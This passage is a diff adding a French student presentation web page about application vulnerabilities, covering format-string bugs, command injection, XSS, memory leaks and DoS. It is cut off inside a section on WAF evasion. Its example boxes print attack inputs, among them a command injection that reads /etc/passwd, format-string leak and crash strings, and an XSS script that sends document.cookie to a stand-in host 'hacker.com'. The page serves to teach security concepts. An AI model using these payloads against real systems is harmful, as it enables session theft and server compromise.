@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exposé Universitaire : Menaces Applicatives</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        /* === VARIABLES & THÈME HAUTE DENSITÉ === */
+        :root {
+            --bg-deep: #010409; /* Noir abyssal */
+            --bg-darker: #0a0f1d;
+            --neon-cyan: #00f3ff;
+            --neon-blue: #0044ff;
+            --neon-purple: #8a2be2;
+            --text-main: #f0f6fc;
+            --text-muted: #8b9bb4;
+            --error-red: #ff2a55;
+            --success-green: #00fa9a;
+            --warning-orange: #ffab00;
+            
+            /* Effets de verre */
+            --glass-bg: rgba(10, 15, 29, 0.4);
+            --glass-border: rgba(0, 243, 255, 0.15);
+            --glass-glow: rgba(0, 243, 255, 0.05);
+            
+            --font-heading: 'Orbitron', sans-serif;
+            --font-body: 'Inter', sans-serif;
+            --font-code: 'Fira Code', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: var(--font-body);
+            font-size: 1.1rem;
+            line-height: 1.7;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* === FOND CYBERSÉCURITÉ ANIMÉ (PARTICULES & GRILLE) === */
+        .parallax-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: radial-gradient(circle at 50% 50%, var(--bg-darker) 0%, var(--bg-deep) 100%);
+            z-index: -2;
+        }
+        .parallax-bg::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 200%;
+            background-image: 
+                linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: gridScroll 30s linear infinite;
+            transform: perspective(500px) rotateX(60deg) translateY(-100px) scale(2.5);
+            transform-origin: top center;
+            opacity: 0.6;
+        }
+        .parallax-bg::after {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(0, 243, 255, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(0, 68, 255, 0.05) 0%, transparent 40%);
+            z-index: -1;
+        }
+        @keyframes gridScroll {
+            0% { transform: perspective(500px) rotateX(60deg) translateY(0) scale(2.5); }
+            100% { transform: perspective(500px) rotateX(60deg) translateY(40px) scale(2.5); }
+        }
+
+        /* === TYPOGRAPHIE & GLOW EFFECT PRO === */
+        h1, h2, h3, h4 { font-family: var(--font-heading); }
+        
+        /* Effet Glow Multicouche professionnel */
+        .glow-text { 
+            color: #ffffff; 
+            text-shadow: 
+                0 0 5px rgba(0, 243, 255, 0.8),
+                0 0 15px rgba(0, 243, 255, 0.5),
+                0 0 30px rgba(0, 68, 255, 0.4);
+            letter-spacing: 2px;
+        }
+        
+        .text-center { text-align: center; }
+        .mb-2 { margin-bottom: 0.5rem; } .mb-3 { margin-bottom: 1rem; } .mb-4 { margin-bottom: 2rem; } .mt-2 { margin-top: 0.5rem; } .mt-4 { margin-top: 2rem; }
+        .lead { font-size: 1.25rem; font-weight: 600; color: #fff; margin-bottom: 1.5rem; text-shadow: 0 0 10px rgba(255,255,255,0.1); }
+
+        /* === NAVIGATION === */
+        nav {
+            position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center;
+            padding: 1.2rem 5%; z-index: 1000;
+            background: rgba(1, 4, 9, 0.7);
+            backdrop-filter: blur(20px) saturate(150%);
+            -webkit-backdrop-filter: blur(20px) saturate(150%);
+            border-bottom: 1px solid var(--glass-border);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .nav-brand { font-family: var(--font-heading); font-size: 1.5rem; font-weight: 900; color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+        .nav-brand span { color: var(--neon-cyan); text-shadow: 0 0 10px var(--neon-cyan); }
+        .nav-links { display: flex; list-style: none; gap: 3rem; }
+        .nav-links a { color: var(--text-muted); text-decoration: none; font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1.5px; transition: 0.3s; position: relative; }
+        .nav-links a::after { content: ''; position: absolute; width: 0; height: 2px; bottom: -5px; left: 0; background-color: var(--neon-cyan); transition: 0.3s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 0 10px var(--neon-cyan); }
+        .nav-links a:hover { color: #fff; text-shadow: 0 0 8px var(--neon-cyan); }
+        .nav-links a:hover::after { width: 100%; }
+
+        /* === STRUCTURE === */
+        .section { min-height: 100vh; padding: 140px 5% 80px; display: flex; flex-direction: column; justify-content: center; position: relative; }
+        .container { max-width: 1200px; margin: 0 auto; width: 100%; }
+        .section-header { font-size: 2.8rem; margin-bottom: 4rem; text-transform: uppercase; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px; position: relative; }
+        .section-header::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 150px; height: 3px; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); }
+        .section-header span { font-weight: 900; }
+
+        /* === ANIMATIONS (SCROLL) FLUIDES === */
+        .reveal { opacity: 0; transition: all 1.2s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        .fade-in { transform: scale(0.97); }
+        .slide-up { transform: translateY(60px); }
+        .slide-left { transform: translateX(-60px); }
+        .slide-right { transform: translateX(60px); }
+        .reveal.active { opacity: 1; transform: translate(0) scale(1); }
+
+        /* === GLASSMORPHISM CARDS (Ultra Moderne) === */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 3rem;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 20px var(--glass-glow);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .glass-card::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.03), transparent);
+            transform: skewX(-20deg); transition: 0.5s;
+        }
+        .glass-card:hover { 
+            border-color: rgba(0, 243, 255, 0.4); 
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 25px rgba(0, 243, 255, 0.1), inset 0 0 30px rgba(0, 243, 255, 0.05);
+            transform: translateY(-5px);
+        }
+        .glass-card:hover::before { left: 200%; }
+
+        /* === ACCUEIL HERO === */
+        .hero { text-align: center; position: relative; }
+        
+        /* MODIFICATION SPECIFIQUE : Logo en haut à droite */
+        .hero-content { position: relative; width: 100%; }
+        .university-logo {
+            position: absolute;
+            top: -20px;
+            right: 0;
+            z-index: 10;
+            animation: float 6s ease-in-out infinite;
+        }
+        .logo-img { 
+            border-radius: 12px; /* Design plus moderne qu'un rond simple */
+            border: 1px solid var(--neon-cyan); 
+            padding: 10px; 
+            width: 140px; /* Taille proportionnée */
+            height: 140px; 
+            object-fit: contain; 
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 25px rgba(0, 243, 255, 0.2), inset 0 0 15px rgba(0, 243, 255, 0.1);
+            transition: 0.3s;
+        }
+        .logo-img:hover {
+            box-shadow: 0 0 35px rgba(0, 243, 255, 0.5);
+            transform: scale(1.05);
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .university-name { font-size: 1.2rem; color: var(--neon-cyan); text-transform: uppercase; letter-spacing: 4px; margin-bottom: 2rem; font-family: var(--font-heading); font-weight: 500; text-shadow: 0 0 10px rgba(0, 243, 255, 0.2); }
+        .main-title { font-size: 5rem; font-weight: 900; text-transform: uppercase; line-height: 1.1; margin-bottom: 1.5rem; letter-spacing: -1px; }
+        .subtitle { font-size: 1.6rem; color: var(--text-muted); font-weight: 400; margin-bottom: 5rem; letter-spacing: 1px; }
+
+        .team-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; text-align: center; }
+        .label { font-size: 0.85rem; text-transform: uppercase; color: var(--neon-cyan); letter-spacing: 3px; display: block; margin-bottom: 8px; font-family: var(--font-heading); opacity: 0.8; }
+        .team-card p { font-weight: 600; font-size: 1.2rem; color: #fff; }
+        .team-card .date { color: var(--text-muted); font-family: var(--font-code); }
+
+        /* BOUTON HOVER PROFESSIONNEL */
+        .scroll-btn {
+            display: inline-block; margin-top: 5rem; padding: 18px 40px;
+            border: 1px solid var(--neon-cyan); border-radius: 4px; /* Plus cyber qu'arrondi */
+            color: var(--neon-cyan); font-family: var(--font-heading); text-decoration: none; text-transform: uppercase; font-size: 0.95rem; letter-spacing: 3px; font-weight: 600;
+            transition: all 0.4s ease; background: rgba(0, 243, 255, 0.05); position: relative; overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.1);
+        }
+        .scroll-btn::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: var(--neon-cyan); transition: all 0.4s ease; z-index: -1;
+        }
+        .scroll-btn:hover { color: #000; box-shadow: 0 0 30px rgba(0, 243, 255, 0.6); transform: translateY(-3px); }
+        .scroll-btn:hover::before { left: 0; }
+
+        /* === SOMMAIRE PROBLÉMATIQUES === */
+        .grid-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        .prob-link {
+            background: rgba(10, 15, 29, 0.6); border: 1px solid rgba(255,255,255,0.05); padding: 25px 20px; border-radius: 8px;
+            color: var(--text-main); text-decoration: none; font-family: var(--font-heading); font-size: 1rem; letter-spacing: 1px;
+            transition: all 0.3s; display: flex; align-items: center; border-left: 3px solid transparent;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .prob-link:hover { 
+            background: linear-gradient(90deg, rgba(0, 243, 255, 0.1) 0%, transparent 100%); 
+            border-left: 3px solid var(--neon-cyan); color: var(--neon-cyan); 
+            transform: translateX(10px) scale(1.02); 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
+        }
+
+        /* === SECTIONS DÉTAILLÉES === */
+        .prob-section { min-height: auto; padding: 120px 5%; border-top: 1px solid rgba(255,255,255,0.03); }
+        .alt-bg { background: linear-gradient(90deg, rgba(0, 243, 255, 0.02) 0%, transparent 50%, rgba(0, 68, 255, 0.02) 100%); }
+        .full-width-card { width: 100%; border-left: 4px solid var(--neon-cyan); padding: 3.5rem; }
+        .prob-header { display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 2.5rem; }
+        .prob-num { 
+            background: transparent; color: var(--neon-cyan); border: 1px solid var(--neon-cyan);
+            font-family: var(--font-code); font-weight: 700; padding: 6px 18px; border-radius: 4px; font-size: 1.1rem; margin-bottom: 15px; 
+            box-shadow: inset 0 0 10px rgba(0,243,255,0.2), 0 0 10px rgba(0,243,255,0.2); 
+            letter-spacing: 2px;
+        }
+        .prob-header h3 { font-size: 2.2rem; line-height: 1.3; }
+
+        .prob-content { display: grid; grid-template-columns: 1.2fr 0.8fr; gap: 4rem; }
+        .prob-content h4 { color: #fff; text-transform: uppercase; font-size: 1.1rem; margin-bottom: 15px; letter-spacing: 2px; border-bottom: 1px dashed var(--glass-border); padding-bottom: 8px; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
+        .prob-content p { color: var(--text-muted); margin-bottom: 1.5rem; text-align: justify; font-size: 1.15rem; }
+
+        /* === TERMINAL HACKER (CODE) === */
+        .code-box { 
+            background: #060913; padding: 25px; border-radius: 8px; font-family: var(--font-code); font-size: 0.95rem; line-height: 1.6; color: #a8b2c3; 
+            border: 1px solid #1e293b; position: relative; overflow: hidden; box-shadow: inset 0 0 20px rgba(0,0,0,0.8), 0 10px 20px rgba(0,0,0,0.5);
+        }
+        .code-box::before { 
+            content: "user@cybersec-lab:~#"; position: absolute; top: 0; left: 0; width: 100%; 
+            background: #0f172a; color: var(--success-green); font-size: 0.75rem; padding: 5px 15px; 
+            font-family: var(--font-code); border-bottom: 1px solid #1e293b; 
+        }
+        .code-box { padding-top: 40px; }
+        
+        .error-box { border-left: 3px solid var(--error-red); }
+        .success-box { border-left: 3px solid var(--success-green); }
+        .warning-box { border-left: 3px solid var(--warning-orange); }
+        
+        .highlight { color: var(--neon-cyan); font-weight: bold; text-shadow: 0 0 8px rgba(0,243,255,0.4); }
+        .highlight-red { color: var(--error-red); font-weight: bold; text-shadow: 0 0 8px rgba(255,42,85,0.4); }
+        .comment { color: #475569; font-style: italic; }
+        
+        .cyber-list { list-style: none; color: var(--text-muted); font-size: 1.15rem; }
+        .cyber-list li { margin-bottom: 12px; padding-left: 25px; position: relative; }
+        .cyber-list li::before { content: '▹'; position: absolute; left: 0; top: 0; color: var(--neon-cyan); font-size: 1.2rem; font-family: var(--font-code); text-shadow: 0 0 5px var(--neon-cyan); }
+
+        /* === VIDÉO === */
+        .video-container { width: 100%; max-width: 1000px; margin: 0 auto; border: 1px solid var(--neon-cyan); padding: 10px; border-radius: 12px; background: rgba(0,0,0,0.6); box-shadow: 0 0 30px rgba(0,243,255,0.15); position: relative; }
+        .video-container::after { content: ''; position: absolute; top: -1px; left: -1px; width: 20px; height: 20px; border-top: 2px solid var(--neon-cyan); border-left: 2px solid var(--neon-cyan); }
+        .video-container::before { content: ''; position: absolute; bottom: -1px; right: -1px; width: 20px; height: 20px; border-bottom: 2px solid var(--neon-cyan); border-right: 2px solid var(--neon-cyan); }
+        video { width: 100%; border-radius: 6px; display: block; }
+
+        /* === CONCLUSION === */
+        .final-section { text-align: center; justify-content: center; min-height: 80vh; background: radial-gradient(circle at center, rgba(0, 68, 255, 0.1) 0%, transparent 60%); }
+        .huge-text { font-size: 4.5rem; text-transform: uppercase; letter-spacing: 8px; margin-bottom: 1rem; }
+        .pulse-text { font-family: var(--font-code); color: var(--neon-cyan); animation: pulse 3s infinite; font-size: 1.2rem; letter-spacing: 2px; }
+        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; text-shadow: 0 0 15px var(--neon-cyan); } }
+        .shield-icon { font-size: 6rem; filter: drop-shadow(0 0 30px var(--neon-cyan)); animation: float 6s ease-in-out infinite; margin-top: 2rem;}
+
+        /* === RESPONSIVE PARFAIT === */
+        @media (max-width: 1100px) {
+            .prob-content { grid-template-columns: 1fr; gap: 3rem; }
+        }
+        @media (max-width: 992px) {
+            .main-title { font-size: 4rem; }
+            .university-logo { position: relative; top: 0; right: auto; display: flex; justify-content: center; margin-bottom: 30px; animation: none; }
+            .logo-img { width: 120px; height: 120px; }
+        }
+        @media (max-width: 768px) {
+            nav { padding: 1rem 5%; }
+            .nav-brand { font-size: 1.2rem; }
+            .nav-links { display: none; } 
+            .main-title { font-size: 2.5rem; }
+            .subtitle { font-size: 1.2rem; margin-bottom: 3rem; }
+            .team-grid { grid-template-columns: 1fr; gap: 2rem; }
+            .prob-header h3 { font-size: 1.6rem; }
+            .section-header { font-size: 2.2rem; }
+            .full-width-card { padding: 2rem; }
+            .huge-text { font-size: 2.5rem; letter-spacing: 3px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="parallax-bg"></div>
+
+    <nav id="navbar">
+        <div class="nav-brand">Cyber<span>Sec</span> Institute</div>
+        <ul class="nav-links">
+            <li><a href="#accueil">Accueil</a></li>
+            <li><a href="#intro">Introduction</a></li>
+            <li><a href="#liste-problematiques">Problématiques</a></li>
+            <li><a href="#technique">Technique</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ul>
+    </nav>
+
+    <header id="accueil" class="section hero">
+        <div class="hero-content reveal slide-up">
+            
+            <div class="university-logo">
+                <img src="image/logo.jpg" alt="Logo Institut" class="logo-img">
+            </div>
+
+            <h3 class="university-name">Institut Supérieur des Technologies de l'Information</h3>
+            
+            <h1 class="main-title glow-text">Analyse des Vulnérabilités Applicatives</h1>
+            <h2 class="subtitle">Exploitation des Chaînes de Format et Entrées Utilisateurs</h2>
+            
+            <div class="glass-card team-card">
+                <div class="team-grid">
+                    <div>
+                        <span class="label">Équipe de Recherche</span>
+                        <p>med amine labbaoui • aysser jlassi • zouhair al haj • mohsen</p>
+                    </div>
+                    <div>
+                        <span class="label">BC</span>
+                        <p class="date">ISAEG 2025 - 2026</p>
+                    </div>
+                </div>
+            </div>
+            <a href="#intro" class="scroll-btn">Débuter l'exploration ↓</a>
+        </div>
+    </header>
+
+    <section id="intro" class="section">
+        <div class="container reveal fade-in">
+            <h2 class="section-header">01. <span class="glow-text">Introduction</span></h2>
+            <div class="glass-card content-card">
+                <p class="lead">Dans l'architecture contemporaine des systèmes d'information, la surface d'attaque logicielle est structurellement liée aux interfaces traitant les données externes.</p>
+                <p>La confiance aveugle accordée aux flux de données entrants constitue la faille originelle permettant la compromission de l'intégrité systémique. Cette étude académique dissèque deux vecteurs d'exploitation majeurs : la manipulation non validée des <strong>entrées utilisateurs</strong> et l'altération de la mémoire via les <strong>chaînes de format</strong>.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="liste-problematiques" class="section">
+        <div class="container reveal slide-up">
+            <h2 class="section-header">02. <span class="glow-text">Axe de Recherche</span></h2>
+            <p class="text-center mb-4" style="color: var(--text-muted); font-size: 1.2rem;">Sélectionnez une problématique pour accéder à son analyse détaillée :</p>
+            <div class="grid-links">
+                <a href="#prob-1" class="prob-link">1. Nature des failles d'entrées</a>
+                <a href="#prob-2" class="prob-link">2. Mécanique des chaînes de format</a>
+                <a href="#prob-3" class="prob-link">3. Le paradigme de la confiance implicite</a>
+                <a href="#prob-4" class="prob-link">4. Conséquences de l'injection (RCE)</a>
+                <a href="#prob-5" class="prob-link">5. Exploitation via XSS</a>
+                <a href="#prob-6" class="prob-link">6. Fuite de mémoire (Memory Leak)</a>
+                <a href="#prob-7" class="prob-link">7. Déni de Service (DoS) applicatif</a>
+                <a href="#prob-8" class="prob-link">8. Obfuscation et contournement WAF</a>
+                <a href="#prob-9" class="prob-link">9. Principe de moindre privilège</a>
+                <a href="#prob-10" class="prob-link">10. Remédiation et Secure SDLC</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-1" class="section prob-section">
+        <div class="container reveal slide-left">
+            <div class="prob-header">
+                <span class="prob-num">Prob 01</span>
+                <h3 class="glow-text">Quelle est la nature fondamentale d'une vulnérabilité liée aux entrées utilisateurs ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>Une vulnérabilité d'entrée survient lorsqu'une application accepte des données d'une source non fiable sans procéder à une <strong>sanitisation</strong> (nettoyage) ou une <strong>validation stricte</strong> (vérification de type/format). Le parseur de l'application interprète alors ces données parasites comme des instructions légitimes exécutables.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Le problème architectural réside dans la confusion entre le <em>canal de contrôle</em> (les commandes du programme) et le <em>canal de données</em> (les entrées). Sans échappement (escaping) adéquat, une donnée insérée peut franchir cette frontière syntaxique et altérer la logique d'exécution initiale prévue par le développeur.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box error-box">
+                            <span class="comment">// Scénario : Un champ "Nom" n'est pas filtré en PHP.</span><br>
+                            <strong>Saisie utilisateur :</strong> <br>
+                            <code>&lt;script&gt;steal_cookie();&lt;/script&gt;</code><br><br>
+                            <strong>Résultat :</strong><br>
+                            Le navigateur reçoit et exécute la balise script au lieu d'afficher simplement du texte.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-2" class="section prob-section alt-bg">
+        <div class="container reveal slide-right">
+            <div class="prob-header">
+                <span class="prob-num">Prob 02</span>
+                <h3 class="glow-text">Comment les chaînes de format (Format Strings) exploitent-elles la structure de la mémoire ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>Dans les langages de bas niveau comme le C/C++, les fonctions d'E/S (comme <code>printf()</code>) utilisent des spécificateurs (ex: <code>%x</code>, <code>%s</code>, <code>%n</code>) pour formater les variables. Si la chaîne de format est contrôlée par l'utilisateur sans arguments définis, elle permet de lire ou d'écrire arbitrairement dans la pile d'exécution (Stack).</p>
+                        <h4>Explication Technique</h4>
+                        <p>La fonction <code>printf</code> est dite <em>variadique</em>. Le registre pointeur d'instruction avance dans la pile pour chaque spécificateur rencontré. S'il y a plus de spécificateurs que d'arguments fournis par le programmeur, la fonction lira inévitablement les données adjacentes présentes en mémoire, détruisant l'isolation spatiale du processus.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box error-box">
+                            <span class="comment">// Code C vulnérable : printf(user_input);</span><br>
+                            <strong>Saisie utilisateur :</strong> <br>
+                            <code>%08x.%08x.%08x</code><br><br>
+                            <strong>Résultat (Leak mémoire) :</strong> <br>
+                            <code>bffff714.08049f54.00000001</code><br>
+                            <span class="comment">-> L'attaquant vient d'afficher 3 adresses brutes de la pile.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-3" class="section prob-section">
+        <div class="container reveal slide-left">
+            <div class="prob-header">
+                <span class="prob-num">Prob 03</span>
+                <h3 class="glow-text">Pourquoi la confiance implicite constitue-t-elle une erreur d'architecture systémique ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>La confiance implicite viole le paradigme de sécurité moderne dit <strong>Zero Trust</strong>. Partir du postulat qu'un utilisateur, ou même une API interne, fournira systématiquement des données bienveillantes et correctement formatées est une erreur conceptuelle fatale.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Les modèles de sécurité obsolètes se basaient sur la sécurité périmétrique (le pare-feu protège tout). Aujourd'hui, chaque point d'entrée (formulaires, headers HTTP, WebSockets) doit être modélisé comme une zone de danger. L'architecture doit appliquer la <em>Défense en Profondeur</em> (Defense in Depth), où chaque composant valide les données indépendamment.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Conceptuel</h4>
+                        <div class="code-box warning-box">
+                            <strong>Approche obsolète (Confiance implicite) :</strong><br>
+                            Le frontend vérifie que l'âge est un nombre. Le backend fait confiance au frontend et insère directement en base.<br><br>
+                            <strong>Approche Zero Trust :</strong><br>
+                            Le frontend filtre pour l'UX. <strong>ET</strong> le backend revérifie le type, la taille et échappe la donnée avant l'insertion SQL.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-4" class="section prob-section alt-bg">
+        <div class="container reveal slide-right">
+            <div class="prob-header">
+                <span class="prob-num">Prob 04</span>
+                <h3 class="glow-text">Quelles sont les conséquences d'une exécution de code à distance (RCE) via injection de commandes ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>L'injection de commandes OS (OS Command Injection) est la faille ultime. Elle permet à l'attaquant de manipuler le système d'exploitation hôte directement, en exécutant des commandes système avec les mêmes privilèges que le processus de l'application web vulnérable.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Elle se produit lorsque l'application utilise des fonctions de wrapping système (comme <code>system()</code> ou <code>exec()</code> en PHP/Python) pour interagir avec l'OS, et y concatène directement une entrée utilisateur. L'attaquant utilise des terminateurs de commande (comme <code>;</code>, <code>&&</code>, ou <code>|</code>) pour ajouter ses propres instructions.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box error-box">
+                            <span class="comment">// Un outil réseau ping une IP fournie</span><br>
+                            <code>system("ping -c 4 " + user_ip);</code><br><br>
+                            <strong>Payload de l'attaquant :</strong><br>
+                            <code>127.0.0.1; cat /etc/passwd</code><br><br>
+                            <strong>Résultat exécuté par le serveur :</strong><br>
+                            <code>ping -c 4 127.0.0.1; <span class="highlight-red">cat /etc/passwd</span></code>
+                            <span class="comment"><br>-> Le serveur renvoie le fichier des mots de passe.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-5" class="section prob-section">
+        <div class="container reveal slide-left">
+            <div class="prob-header">
+                <span class="prob-num">Prob 05</span>
+                <h3 class="glow-text">Comment le Cross-Site Scripting (XSS) détourne-t-il la confiance du client ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>Contrairement à l'injection SQL qui attaque le serveur, le XSS utilise le serveur vulnérable comme vecteur pour <strong>attaquer les clients (les navigateurs des autres utilisateurs)</strong>. Le navigateur de la victime exécute un script malveillant en lui accordant la même confiance qu'au site web légitime.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Cette faille apparaît lorsque des données fournies par un utilisateur sont incluses dans une page web générée sans être correctement encodées (HTML Entity Encoding). Le DOM interprète alors les caractères <code>&lt;</code> et <code>&gt;</code> comme de véritables balises exécutables (JavaScript) et non comme du texte.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box error-box">
+                            <span class="comment">// XSS Stocké dans un forum de discussion</span><br>
+                            <strong>Commentaire posté :</strong><br>
+                            <code>&lt;script&gt;fetch('http://hacker.com/?cookie=' + document.cookie)&lt;/script&gt;</code><br><br>
+                            <strong>Résultat :</strong><br>
+                            Chaque utilisateur qui lit ce commentaire envoie silencieusement son identifiant de session (cookie) au serveur de l'attaquant, permettant le vol de compte (Session Hijacking).
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-6" class="section prob-section alt-bg">
+        <div class="container reveal slide-right">
+            <div class="prob-header">
+                <span class="prob-num">Prob 06</span>
+                <h3 class="glow-text">Comment une chaîne de format peut-elle détruire la confidentialité (Memory Leak) ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>L'exploitation de la mémoire via les Format Strings permet le contournement total des mécanismes de confidentialité de l'application. Un attaquant peut procéder à un "Dump" (une copie sauvage) de la mémoire RAM allouée au programme en cours d'exécution.</p>
+                        <h4>Explication Technique</h4>
+                        <p>En utilisant séquentiellement des spécificateurs de lecture (comme <code>%x</code> pour l'hexadécimal ou <code>%s</code> pour lire une chaîne à un pointeur donné), l'attaquant remonte la pile d'exécution. La mémoire contenant souvent des variables d'environnement, la confidentialité est violée.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box warning-box">
+                            <strong>Impact d'un Memory Leak :</strong><br>
+                            En balayant la mémoire d'un daemon applicatif vulnérable (comme un serveur FTP mal codé), l'attaquant peut retrouver en clair :<br>
+                            - Les clés de chiffrement privées (RSA/AES)<br>
+                            - Les mots de passe administrateur non hashés<br>
+                            - Les jetons d'accès API (Tokens OAuth)
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-7" class="section prob-section">
+        <div class="container reveal slide-left">
+            <div class="prob-header">
+                <span class="prob-num">Prob 07</span>
+                <h3 class="glow-text">De quelle manière ces vulnérabilités mènent-elles au Déni de Service (DoS) ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>Le pilier de la "Disponibilité" (Availability de la triade CIA) peut être anéanti par un attaquant cherchant à crasher intentionnellement l'application via une entrée corrompue ou une chaîne de format mortelle, provoquant un <strong>Déni de Service (DoS) applicatif</strong>.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Dans le cas d'une Format String, si l'attaquant utilise le spécificateur <code>%s</code>, le programme tentera de lire la chaîne située à l'adresse mémoire de la prochaine valeur de la pile. Si cette valeur est <code>0x00000000</code> (adresse invalide), le système d'exploitation interviendra et tuera le processus via une <span class="highlight-red">Erreur de Segmentation (SegFault)</span>.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box error-box">
+                            <span class="comment">// Saisie provoquant le crash immédiat</span><br>
+                            <strong>Payload :</strong> <code>%s%s%s%s%s%s%s%s%s%s</code><br><br>
+                            <strong>Résultat (Syslog) :</strong><br>
+                            <code>Process 4092 (server.exe) killed by SIGSEGV (Segmentation fault) at address 0x0.</code><br>
+                            <span class="comment">-> L'application s'arrête, les utilisateurs légitimes ne peuvent plus y accéder.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-8" class="section prob-section alt-bg">
+        <div class="container reveal slide-right">
+            <div class="prob-header">
+                <span class="prob-num">Prob 08</span>
+                <h3 class="glow-text">Quelles techniques d'obfuscation contournent les filtres de sécurité basiques ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
